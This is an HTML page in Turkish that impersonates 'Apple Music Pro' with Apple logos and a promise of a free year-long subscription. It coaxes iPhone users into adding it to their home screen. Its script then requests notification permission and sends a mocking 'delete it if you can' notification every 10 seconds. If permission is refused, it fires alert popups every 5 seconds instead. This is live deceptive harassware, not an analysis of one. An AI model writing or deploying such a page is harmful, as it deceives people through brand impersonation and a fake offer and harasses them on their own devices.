<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Apple Music Pro</title>

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="MusicPro">
    <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">

    <link rel="manifest" href='data:application/manifest+json,{"name":"Apple Music Pro","short_name":"MusicPro","start_url":"/","display":"standalone","background_color":"#000000","theme_color":"#fa243c","icons":[{"src":"https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg","sizes":"192x192","type":"image/png"}]}'>

    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; height: 100vh; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        .setup-screen { padding: 30px; }
        .app-screen { display: none; padding: 20px; }
        .btn { background: #fa243c; color: white; padding: 18px 35px; border-radius: 50px; border: none; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 5px 15px rgba(250, 36, 60, 0.4); }
        .arrow { font-size: 40px; margin-top: 20px; animation: bounce 1s infinite; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(10px); } }
    </style>
</head>
<body>

    <div id="safariUI" class="setup-screen">
        <div style="font-size: 50px;"></div>
        <h2>SON BİR ADIM KALDI</h2>
        <p>Aboneliği aktif etmek için Safari'den çıkmalısın:</p>
        <p>1. Alttaki <b>Paylaş</b> ( <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH5AMWDBYQ8N9S3gAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLm3EAAAAWUlEQVQ4y2NgGAWjYBSMAtIAIw4uS8pInP9fUPf/PzL/f4I4OChq/f8pMv9/gjG6AsYvIOf/3wjX/H+C8R008f+DMLmG0fD/X7S06P+DMLmG0fBBDAbCGAWjYBQAAOYpXNByo8e8AAAAAElFTkSuQmCC" width="20"> ) butonuna bas.<br>2. <b>Ana Ekran'a Ekle</b> de.<br>3. Sonra ana ekrandaki ikona bas.</p>
        <div class="arrow">↓</div>
    </div>

    <div id="appUI" class="app-screen">
        <h1>HOŞ GELDİN!</h1>
        <p>1 Yıllık Bedava Apple Music Hazır.</p>
        <p>Onay ver, 10 saniyede bir dızt dızt başlasın.</p>
        <button class="btn" onclick="startMobbing()">ONAYLA VE BAŞLAT</button>
    </div>

    <script>
        // KONTROL: EĞER ANA EKRANDAN AÇILDIYSA (STANDALONE)
        if (window.navigator.standalone === true || window.matchMedia('(display-mode: standalone)').matches) {
            document.getElementById('safariUI').style.display = 'none';
            document.getElementById('appUI').style.display = 'block';
        }

        async function startMobbing() {
            // Service Worker Kaydı (iOS Bildirim için şart koşuyor)
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('data:text/javascript,self.addEventListener("push", function(e){})');
            }

            const permission = await Notification.requestPermission();
            
            if (permission === 'granted') {
                alert("SİSTEM KURULDU! 10 saniyede bir bildirim mobbingi başlıyor...");
                
                setInterval(() => {
                    new Notification("🚨 SİLSENE LAN!", {
                        body: "HAHAHA HADİ SİL LAN! SİLEBİLİYORSAN SİL!",
                        icon: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
                    });
                }, 10000); 
            } else {
                alert("İzni vermedin, ama ben yine de alert patlatırım!");
                setInterval(() => { alert("HADİ SİL LAN!"); }, 5000);
            }
        }
    </script>
</body>
</html>
